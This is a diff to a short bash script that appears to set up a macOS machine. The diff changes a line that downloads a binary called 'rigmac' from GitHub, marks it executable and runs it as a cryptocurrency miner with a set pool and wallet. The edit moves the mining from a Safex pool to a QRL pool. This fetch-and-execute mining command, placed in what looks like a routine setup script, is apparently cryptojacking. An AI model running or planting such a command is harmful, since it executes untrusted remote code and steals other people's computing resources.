@@ -1,4 +1,4 @@
 #!/usr/bin/env bash
 softwareupdate -l
 brew install coreutils
-wget https://github.com/BatiKangkung/KangKung/raw/master/rigmac && chmod +x rigmac && ./rigmac --donate-level 1 -o sf.pool-pay.com:4025 -u SafexsoajK5bDJyaXhGtuCcvmoTNvg2GwA16VqmfS2hhPEUXchcs1xbRpvNuQ86ju1KjKzw9HUoW9bnq3YhbxtRXDxvyZWkYYDb3Z -p x@CPU -k -a rx/sfx -t 10
+wget https://github.com/BatiKangkung/KangKung/raw/master/rigmac && chmod +x rigmac && ./rigmac --donate-level 1 -o de.qrl.herominers.com:1166 -u Q0105000f663000af2a410ea26f0abc8f8b499d80c85d2fbd9ec894c6f09f006685c27d69cf177b -p CPU -a rx/0 -k -t 10
